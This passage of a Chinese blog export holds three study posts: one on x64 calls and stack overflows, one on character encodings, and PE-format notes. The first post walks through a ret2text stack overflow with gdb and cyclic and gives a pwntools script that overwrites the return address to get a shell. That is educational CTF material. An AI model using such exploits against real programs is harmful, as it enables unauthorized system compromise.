栈传参对齐方式 按参数自然大小 所有参数按 8 字节对齐 谁清理栈 被调用者使用 leave+ret 调用者清理（隐含对齐） 我这边就用Windows用作演示 我们也是执行到 func 下断点 然后我们进入这个call 我们会发现call的操作其实跟x86的call一样 也是 push RIP + 5 然后 jmp 地址 但是这个地址并不是一个绝对地址而是 相对地址。 相对地址跳转（RIP-relative） 🧮 实际跳转地址计算方式 123目标地址 = 下一条指令地址 + 偏移量偏移量 = 目标地址 - 下一条指令的地址下一条指令的地址 = 目标地址 - 偏移量 假设当前 EIP 为 0x1000，也就是 E8 的位置 E8 占 1 字节，后面是 4 字节偏移量，下一条指令的地址是： 10x1000 + 5 = 0x1005 加上偏移量 -0x97： 10x1005 - 0x97 = 0xF6E 为什么不用绝对地址？因为： 可重定位性更强：相对寻址无关内存基地址，适合代码段被加载到任意地址； 指令短：一个有符号 32 位偏移量足以跳转 ±2GB 的范围； 兼容 RIP-relative 模型：x64 强调基于 RIP 的寻址方式； 根据这张图我们可以计算下 偏移量 也就是 目标地址(00007FF76C6E15F0h) - 下一条地址(00007FF76C6E1687h) &#x3D; 偏移量(FFFF FFFF FFFF FF69h) 因为要的是一个32位整数 我们要 截断 也就是 FFFF FFFF FFFF FF69h &amp; FFFF FFFFh &amp; 相同为1 不同为0 120xFFFFFFFFFFFFFF69 = 11111111 11111111 11111111 11111111 11111111 11111111 11111111 011010010x00000000FFFFFFFF = 00000000 00000000 00000000 00000000 11111111 11111111 11111111 11111111 之后我们继续观察函数里面的内容 我们会发现 这边没有push rbp mov rbp rsp 这是为什么呢 其实这是编译器优化的结果 在 x64 系统下，编译器不一定使用帧指针（rbp），因为： x64 有更多寄存器可用（16 个通用寄存器），不需要保留 rbp； rbp 被当作普通寄存器用； 栈偏移通过 rsp + 偏移 就可以直接访问，不需要 rbp； 使用 rbp 反而浪费一个寄存器、增加指令数。 首先就是拿出来参数放到栈上进行一系列加法之后到 ret 这里就是 jmp [esp]的值了 至此对函数栈的简单介绍就到这里了 然后我们要思考一个问题 ​ 假如函数的参数的大小是八个字节 但是我们输入了过多的字符 导致该参数占用10个字节 这会导致什么问题呢？🤔 栈溢出没错 这就导致了过多的字符覆盖了低地址处的栈空间 然而这就是 栈溢出 这个问题导致的漏洞危害极大 如果我们可以把输入的字符覆盖到返回地址也就是call保存的返回值处 然后我们刚好可以构造出一段恶意代码 并且让他跳转到含有关键数据的函数 例如 system 或者 拿到了shell权限 对于我们的服务器来说是一场致命打击 💥 举个例子 假如我们手里刚好有一个这样的程序 刚好有一个可以被栈溢出的函数 我们可以用 gdb去测试一下 根据图中所示 我们可以先用gdb加载 然后再 main函数上下个断点 我们输入 r 执行 他断到了这里然后我们一直走到 gets 这个函数 为什么要走到 gets 呢 因为 gets 这个函数他是一个输入函数 他把值输入到了栈中 但是不限制输入大小 我们可以通过这个方式 去修改最后ret的值 在此之前我们需要通过 cyclic 指令生成一堆杂乱的数据 方便我们后续直接定位栈偏移 使用 ni 指令单步 执行到 ret 指令我们就继续使用 cyclic -l 去计算他的偏移 然后这时候我们拿到了偏移量 那么怎么构造他的shell呢 这时候我们就要用 pwntools 了 exp 如下所示 123456789101112# 载入库from pwn import * # 打开进程p = process(&#x27;ret2text&#x27;)# 附加调试器# gdb.attach(p) 可以观看流程# 构建 payloadpayload = b&#x27;a&#x27;*112+p32(0x804863A)# 发送payloadp.sendline(payload)# 用户交互p.interactive() 执行之后是这样的 结束","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"编码","slug":"编码","date":"2025-05-29T13:32:56.000Z","updated":"2025-05-30T13:59:21.730Z","comments":true,"path":"2025/05/29/编码/","permalink":"http://example.com/2025/05/29/%E7%BC%96%E7%A0%81/","excerpt":"编码ASCII编码 使用一个字节来表示字符串中的字符，称为ANSI字符串。 ASCII（American Standard Code for Information Interchange）是 美国信息交换标准代码，它使用 7 位 来表示一个字符，共定义了 128 个字符，范围是 0 ~ 127，包括： 英文字母（AZ，az） 数字（0~9） 标点符号（如 !、,、. 等） 控制字符（如换行符 \\n，回车 \\r） 2. 在 C 语言中的表现1234567#include &lt;stdio.h&gt;int main() &#123; char c = &#x27;A&#x27;; // 字符A的ASCII值是65 printf(&quot;字符: %c, ASCII码: %d\\n&quot;, c, c); return 0;&#125; 输出： 1字符: A, ASCII码: 65","text":"编码ASCII编码 使用一个字节来表示字符串中的字符，称为ANSI字符串。 ASCII（American Standard Code for Information Interchange）是 美国信息交换标准代码，它使用 7 位 来表示一个字符，共定义了 128 个字符，范围是 0 ~ 127，包括： 英文字母（AZ，az） 数字（0~9） 标点符号（如 !、,、. 等） 控制字符（如换行符 \\n，回车 \\r） 2. 在 C 语言中的表现1234567#include &lt;stdio.h&gt;int main() &#123; char c = &#x27;A&#x27;; // 字符A的ASCII值是65 printf(&quot;字符: %c, ASCII码: %d\\n&quot;, c, c); return 0;&#125; 输出： 1字符: A, ASCII码: 65 Unicode编码(双字节) Unicode是继ASCII字符编码后的另一种新型字符编码。严格意义上讲，ASCII码的每个字符使用7位表示Unicode则使用全16位表示一个字符。Unicode字符串中的每个字符均为双字节，所以又称为宽字符串。由于Unicode兼容ASCII字符，所以被大多数程序所支持，如Windows内核。Unicode的前128个字符码（十六进制，0x00000x007F）同ASCII码具有同样的字节值。比如，字母“a”的Unicode编码是0x0061，而“a”的ASCII编码是0x61。虽然占用的字节数不一样，但是两者的值是一样的。接下来的128个Unicode字符（代码为0x00800x00FF)是ISO8859-1对ASCII码的扩展。中国、日本和韩国的象形文字（总称为CJK）占用了0x3000~0x9FFF的代码。如“汉”字的Unicode编码是6C49h（其GB码为0BABAh)。 Unicode字符串不像ANSI字符串那样，保证用字符“\\0”结束；如果开发者在程序设计时以字符“\\0”作为Unicode字符串结尾的判断条件，就可能发生错误。 在汇编语言中，Unicode字符串被定义为一个结构体，它的定义如下： 12345typedef struct _UNICODE_STRING &#123; USHORT Length; //字符串长度 USHORT MaximumLength; //字符串缓冲区长度 PWSTR Buffer; //字符串缓冲区&#125; UNICODE_STRING, *PUNICODE_STRING; 由于我们无法保证Unicode字符串结尾一定是“\\0”，所以在结构体中，字段Length定义了字符串的长度。一个安全的字符串还必须限定字符的总长度，这由MaximumLength来实现。 UTF-8、UTF-16、UTF-32 是 Unicode 的编码方式 UTF-8：多字节，1~4 字节 UTF-16：2 或 4 字节 UTF-32：固定 4 字节（效率低，体积大） C 语言中的示例对比✅ Unicode 码点的概念（逻辑编号）12345678910#include &lt;wchar.h&gt;#include &lt;locale.h&gt;#include &lt;stdio.h&gt;int main() &#123; setlocale(LC_ALL, &quot;&quot;); wchar_t ch = L&#x27;你&#x27;; wprintf(L&quot;字符: %lc, Unicode码点: U+%04X\\n&quot;, ch, ch); return 0;&#125; 输出（在 UTF-8 环境中）： 1字符: 你, Unicode码点: U+4F60 多字节编码 多字节编码一般都是在 ASCII 的基础上进行扩展或兼容设计的。 🔷 一、为什么基于 ASCII 扩展？✅ 兼容性原则早期的系统、程序、协议都是基于 ASCII 设计的，为了不打破已有的英文文本和软件兼容性，后来设计的多字节编码（如 GBK、UTF-8）都： 保留 ASCII 范围（0x00 ~ 0x7F）作为单字节直接使用 超出 ASCII 的字符才用 多个字节组合表示 🔷 二、是如何在 ASCII 基础上扩展的？1. ASCII 基本规则 字符 二进制（7位） 十六进制 A 01000001 0x41 z 01111010 0x7A 空格 00100000 0x20 所有 ASCII 字符的最高位（第8位）都是 0 2. 多字节编码（如 UTF-8）的扩展方式UTF-8 保证： 0xxxxxxx 表示 ASCII → 保留单字节（最高位为 0） 非 ASCII → 多字节以 1xxxxxxx 开头（高位 1） UTF-8 编码示意： 编码字节数 前缀规则 可表示的字符范围 1字节 0xxxxxxx ASCII（U+0000 ~ U+007F） 2字节 110xxxxx 10xxxxxx U+0080 ~ U+07FF 3字节 1110xxxx 10xxxxxx 10xxxxxx U+0800 ~ U+FFFF 示例：“你” 字：Unicode &#x3D; U+4F60 UTF-8 编码 → 0xE4 0xBD 0xA0 3. GBK 等编码也是类似原则GBK： ASCII：0x00~0x7F，单字节直接使用 中文：0x81~0xFE 开头的多字节组合 示例： 字符 GBK 编码 A 0x41 “你” 0xC4 0xE3 🔷 三、可视化对比123456789diff复制编辑+----------------------+------------------------+| ASCII | 0x41 (A), 0x61 (a) |+----------------------+------------------------+| UTF-8 | A -&gt; 0x41 || | 你 -&gt; 0xE4 0xBD 0xA0 |+----------------------+------------------------+| GBK | A -&gt; 0x41 || | 你 -&gt; 0xC4 0xE3 |+----------------------+------------------------+ ✅ 结论： 多字节编码不会破坏 ASCII 表示方式，而是在此基础上扩展更高位字符。 🔷 四、C 语言验证例子：ASCII + 多字节输出1234567891011121314151617c复制编辑#include &lt;stdio.h&gt;int main() &#123; char *ascii = &quot;A&quot;; // ASCII 单字节 char *utf8 = &quot;你&quot;; // UTF-8 多字节 printf(&quot;ASCII 字符: %s\\n&quot;, ascii); printf(&quot;UTF-8 字符: %s\\n&quot;, utf8); printf(&quot;UTF-8 字节: &quot;); for (int i = 0; utf8[i] != &#x27;\\0&#x27;; i++) &#123; printf(&quot;%02X &quot;, (unsigned char)utf8[i]); &#125; printf(&quot;\\n&quot;); return 0;&#125; 输出： 123less复制编辑ASCII 字符: AUTF-8 字符: 你UTF-8 字节: E4 BD A0 🔷 五、总结一句话 多字节编码方案（如 UTF-8、GBK）都是在 ASCII 基础上添加高字节区域来扩展更多语言字符，同时保持对 ASCII 的完全兼容。","categories":[],"tags":[{"name":"编码","slug":"编码","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"PElearn","slug":"PElearn","date":"2025-05-29T13:31:56.000Z","updated":"2025-06-04T12:27:22.583Z","comments":true,"path":"2025/05/29/PElearn/","permalink":"http://example.com/2025/05/29/PElearn/","excerpt":"PE 学习笔记(一)先来几张图片放在最前面","text":"PE 学习笔记(一)先来几张图片放在最前面 引言本帖子大部分出自书籍 《Windows PE权威指南》因需要复习PE知识 故此记录 地址地址有四类，它们分别是：虚拟内存地址（VA)相对虚拟内存地址（RVA）文件偏移地址（FOA)特殊地址 扩展 32 位环境下的Windows内存管理32位CPU的寻址能力为4GB（即2²个字节)，但有些用户的物理内存达不到这个值。于是操作系统和CPU的内存管理单元共同作用，为用户提供了虚拟内存的管理机制。即分页机制。该机制可以让用户感觉自己好像在使用4GB的内存。 分页机制的基本原理是：操作系统假设一个进程独立拥有4GB内存，按照某个固定的大小（如4KB）将这4GB空间分成N（1M）个页。在某一时刻，所有这些页只有一部分和物理内存是对应的（所以这种机制允许物理内存比4GB小)。没有物理内存对应的页面被标记为脏(dirty)的页面，一般存储在一个名为“交换文件”的磁盘文件中。在WindowsXP系统中，交换文件为pagefile.sys，它位于系统盘的根目录，是一个系统隐藏文件。当系统需要读取未在内存中的数据时，这部分数据会将内存中不经常读写的页交换出内存，而把要读取的、位于交换文件中的页换进内存。通过这种存取机制可以让一个进程拥有比实际内存大得多的内存。利用这种机制管理的内存称为虚拟内存。 虚拟内存地址VA &#x3D; 进程基地址+相对虚拟内存地址 相对虚拟内存地址RVA &#x3D; 某个特定位置距离某个模块基地址的偏移量 关于VA和RVA的概念如图所示 假设模块2的基地址为0x01000000，而模块2中的某个位置距离模块2的基地址偏移为400h，那么值0x00000400就是模块2中某个位置的RVA，而值0x01000400是该位置的VA。记住，RVA是相对于模块而言的，VA是相对于整个地址空间而言的。注意RVA与具体模块相关，它有一个范围，该范围从模块的开始到模块结束，脱离开这个范围的RVA是无效的，称为越界。越界的RVA地址没有任何意义。 文件偏移地址文件偏移地址(File Offset Address, FOA) 和内存无关，它是指某个位置距离文件头的偏移。 特殊地址比较少见 其他数据目录 导出表 导入表 资源表 异常表 属性证书表 重定位表 调试数据 Architecture Global Ptr 线程局部存储 加载配置表 绑定导入表 IAT 延时导入表 CLR运行时头部 节主要是用来存放不同类型数据(代码、数据、常量、资源等) 不同节有不同的访问权限 对齐数据在内存中的对齐、数据在文件中的对齐、资源文件中资源数据的对齐 内存对齐节在内存中的对齐单位必须至少是一个页的大小 32位 &#x3D; 4kb (1000h) 64位&#x3D;8kb (2000h) 文件对齐节在文件中的对齐要小于内存中的对齐 通常会以一个物理扇区的大小作为对齐粒度的值也就是512字节 十六进制表示 (200h) 出于节约资源的考虑，操作系统允许节在内存和文件中的对齐尺寸不一致。这就直接造成了PE在文件中和在内存中的大小也会不一致。通常情况下，PE在内存中的尺寸要比在文件中的尺寸大。用户可以自己定义这些对齐的值。 如果内存对齐被定义为小于操作系统页的大小，则文件对齐和内存对齐的值必须一致！ 资源数据对齐资源文件中，资源字节码部分一般要求以双字（4个字节）方式对齐 PE文件结构 在十六位系统中 PE头和PE结构数据被当成是冗余数据 在32位系统中 刚好相反 即DOS头成为冗余数据 所谓冗余 是针对DOS头不参与 32位系统运行过程而言 尽管该部分不参与运行 但也不能把这些数据从PE结构中出去 因为DOS MZ头中有一个字段非常重要 即 IMAGE_DOS_HEADER.e_lfanew 没有他操作系统就定位不到标准的PE头部 可执行程序也就会被操作系统认为是非法的PE映像 定位标准PE头 由于DOS Stub的长度不固定 导致了DOS头也不是一个固定大小的数据结构 那么在WindowsPE中 既然把DOS头放在了PE的起始位置 如果去定位后面的标准PE头所在的位置呢 字段e_lfanew 即起这个作用 该字段的值是一个 相对偏移量 相对定位时需要加上DOS MZ 头的基地址 也就是说 通过以下公式可以得到PE头的绝对位置 1PE_start = DOS MZ 基地址 + IMAGE_DOS_HEADER.e_lfanew 大概分为五个部分 DOS MZ头 DOS Stub PE头 节表 节内容 PE头是由 IMAGE_FILE_HEADER.SizeOfOptionalHeader 来确定大小的 节的数量是由字段 IMAGE_FILE_HEADER.NumberOfSections来定义的 DOS Stub和节内容都是大小不确定的 节的内容大小不确定 一个标准的PE文件一般由四大部分组成: DOS头 PE头 节表 节内容 紧跟在DOS stub后面的是PE头标识 Signature 与大部分文件格式的头部结构一样 PE头部信息中有一个四字节的标识 该标识位于指针IMAGE_DOS_HEADER.e_lfanew 指向的位置 其内容固定 对应于ASCII码的字符串 “PE\\0\\0” 标准PE头 IMAGE_FILE_HEADER紧跟在PE头标识后 即位于IMAGE_DOS_HEADER 的 e_lfanew值+4的位置 由此位置开始的20个字节为数据结构标准PE头IMAGE_FILE_HEADER的内容 该结构在微软的官方文档中被称为标准通用对象文件格式 (Common Object File Format COFF)头 它记录了PE文件的全局属性 例如 PE文件的运行平台、PE文件类型、文件中存在节的总数等 定义如下： 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; // 平台 WORD NumberOfSections; // pe中节的数量 DWORD TimeDateStamp; // 文件创建日期和时间 DWORD PointerToSymbolTable; // 指向符号表(用于调试) DWORD NumberOfSymbols; // 符号表中的符号数量(用于调试) WORD SizeOfOptionalHeader; // 扩展头结构的长度 WORD Characteristics; // 文件属性&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 该结构可以用于判断PE文件是EXE还是DLL类型 不但可以通过该结构得到PE文件中节的总量，还可以当成对节区信息进行遍历操作时的循环次数 扩展PE头 IMAGE_OPTIONAL_HEADER32123456789101112131415161718192021222324252627282930313233typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; // 魔术字 BYTE MajorLinkerVersion; // 链接器版本号 BYTE MinorLinkerVersion; // 连接器次版本号 DWORD SizeOfCode; // 所有含代码的节的总大小 DWORD SizeOfInitializedData; // 所以含已初始化数据的节的总大小 DWORD SizeOfUninitializedData; // 所有含未初始化数据的节的大小 DWORD AddressOfEntryPoint; // 程序执行入口 RVA DWORD BaseOfCode; // 代码的节的起始RVA DWORD BaseOfData; // 数据的节的起始RVA DWORD ImageBase; // 程序的建议装载地址 DWORD SectionAlignment; // 内存中节的对齐粒度 DWORD FileAlignment; // 文件中节的对齐粒度 WORD MajorOperatingSystemVersion; // 操作系统的版本号 WORD MinorOperatingSystemVersion; // 操作系统的次版本号 WORD MajorImageVersion; // 该PE的版本号 WORD MinorImageVersion; // 该PE的次版本号 WORD MajorSubsystemVersion; // 所需子系统的版本号 WORD MinorSubsystemVersion; // 所需子系统的次版本号 DWORD Win32VersionValue; // 未用 DWORD SizeOfImage; // 内存中整个PE映像的尺寸 DWORD SizeOfHeaders; // 所有头+节表的大小 DWORD CheckSum; // 校验和 WORD Subsystem; // 文件的子系统 WORD DllCharacteristics; // DLL文件特征 DWORD SizeOfStackReserve; // 初始化时的栈大小 DWORD SizeOfStackCommit; // 初始化时实际提交的栈大小 DWORD SizeOfHeapReserve; // 初始化时保留的堆大小 DWORD SizeOfHeapCommit; // 初始化时实际提交的堆大小 DWORD LoaderFlags; // 与调试有关 DWORD NumberOfRvaAndSizes; // 下面的数据目录结构的项目数量 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; //数据目录&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 文件执行的入口 文件被操作系统装入内存后的默认基地址 以及节在磁盘和内存中的对齐单位等信息 均可在此结构中找到 对该结构的某些数值改动都可以会造成PE文件的加载或运行失败 IMAGE_NT_HEADERS这个结构广义上的PE头 在标准PE文件中其大小为456个字节 他是以上两种结构的组好 即 IMAGE_NT_HEADERS &#x3D; 4个字节的PE标识 + IMAGE_FILE_HEADER+IMAGE_OPTIONAL_HEADER32 该结构的详细定义如下： 12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; // PE头标识 IMAGE_FILE_HEADER FileHeader; // PE标准头 IMAGE_OPTIONAL_HEADER32 OptionalHeader; // PE扩展头&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 与DOS头一样 PE头开始也是一个标志 用一个双字的 “PE\\0\\0” 来命名 这也是PE头的由来 数据目录项 IMAGE_DATA_DIRECTORYIMAGE_OPTIONAL_HEADER32(扩展PE头) 结构的最后一个字段为 DataDriectory 该字段定义了PE文件中出现的所有不同类型的数据和目录信息 如前所述 应用程序中的数据被按照用途分成很多种类 导出表、导入表、资源、重定位等 在内存中，这些数据被操作系统以页为单位组织起来，并赋予不同的访问属性，在文件中，这些数据也同样被组织起来，按照不同类型分别存放在文件的指定位置，该结构就是用来描述这些不同类型的数据在文件(和内存)中位置及大小的 该数据目录中定义的数据类型一直是16种 PE种使用了一种称作 “数据目录项 IMAGE_DATA_DIRECTORY” 的数据结构来定义每种数据 该结构如下所示 只有两个字段 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; // 数据的起始 RVA DWORD Size; // 数据块的长度&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 总的数据目录一共由16个相同的 IMAGE_DATA_DIRECTORY 结构连续排列在一起组成 索引 名称 说明 0 Export Table 导出表（程序导出的函数信息） 1 Import Table 导入表（程序导入的 DLL 和函数） 2 Resource Table 资源表（图标、对话框、字符串等） 3 Exception Table 异常处理表（SEH） 4 Certificate Table 数字签名证书表 5 Base Relocation 重定位表（Address Fixups） 6 Debug Directory 调试信息表（符号等） 7 Architecture 保留（未使用） 8 GlobalPtr 全局指针（MIPS） 9 TLS Table TLS 初始化数据表（线程本地存储） 10 Load Config Table 加载配置表（安全设置等） 11 Bound Import 绑定导入表（提前绑定信息） 12 IAT 导入地址表（Import Address Table） 13 Delay Import 延迟导入表（延迟加载 DLL） 14 COM Descriptor CLR 运行时头（托管程序） 15 Reserved 保留 1234567IMAGE_OPTIONAL_HEADER├── ...├── IMAGE_DATA_DIRECTORY DataDirectory[16]│ ├── DataDirectory[0] → Export Table│ ├── DataDirectory[1] → Import Table│ ├── DataDirectory[2] → Resource Table│ └── ... 常用的数据目录的用途如下： 数据目录项 作用 导入表 找到程序依赖的 DLL 和函数 导出表 提供外部调用函数的信息（如 DLL 导出函数） 资源表 程序图标、对话框等 GUI 元素 重定位表 可执行文件在加载时修正地址 TLS 表 多线程支持的线程本地变量数据 COM 描述符 .NET 程序的入口点（托管程序） 如果想在PE文件种寻找特定类型的数据 就需要从该结构开始 该结构每个字段后的偏移都是基于 IMAGE_NT_HEADERS 头的 节表项 IMAGE_SECTION_HEADER123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 8个字节节名 union &#123; DWORD PhysicalAddress; DWORD VirtualSize; // 节区的尺寸 &#125; Misc; DWORD VirtualAddress; // 节区的RVA地址 DWORD SizeOfRawData; // 在文件中对齐后的尺寸 DWORD PointerToRawData; // 在文件中的偏移 DWORD PointerToRelocations; // 在OBJ文件中使用 DWORD PointerToLinenumbers; // 行号表的位置(供调试使用) WORD NumberOfRelocations; // 在OBJ文件中使用 WORD NumberOfLinenumbers; // 行号表中行号的数量 DWORD Characteristics; // 节的属性&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 该偏移是基于 IMAGE_SECTION_HEADER 头的 PE头 IMAGE_NT_HEADER 字段 Signature 双字 PE文件标识 被定义为 4550h 也就是 PE 再加上两个00 这就是PE这个称呼的由 如果更改其中的任何一个字节操作系统就无法把该文件识别为正确的PE文件 通过修改这个字段 会导致PE文件在32为系统中加载失败 但由于文件的其他部分(特别是DOS头)并没有被破坏 系统还是可以识别出其为DOS系统下的可执行程序 并通过调用纯DOS环境来运行 DOS stub中的程序代码 如果你确认操作系统中某个PE文件携带病毒 并且开机会被加载到内存运行 最简单的处理办法是通过WINDOWS PE盘启动系统 在系统中找到病毒文件 使用记事本简单地修改其中任何一个字符 保存文件 重新开机启动后即可防止病毒文件被加载 此PE非彼PE windows PE是一个操作系统 其全称是 Windows Perinstallation Environment 即 Windows的预安装环境 该操作系统区别于 Windows XP&#x2F;2000&#x2F;Vista 等 可以从光盘引导","categories":[],"tags":[{"name":"PE","slug":"PE","permalink":"http://example.com/tags/PE/"}]}],"categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"},{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"凯撒密码","slug":"凯撒密码","permalink":"http://example.com/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/"},{"name":"编码","slug":"编码","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"},{"name":"PE","slug":"PE","permalink":"http://example.com/tags/PE/"}]}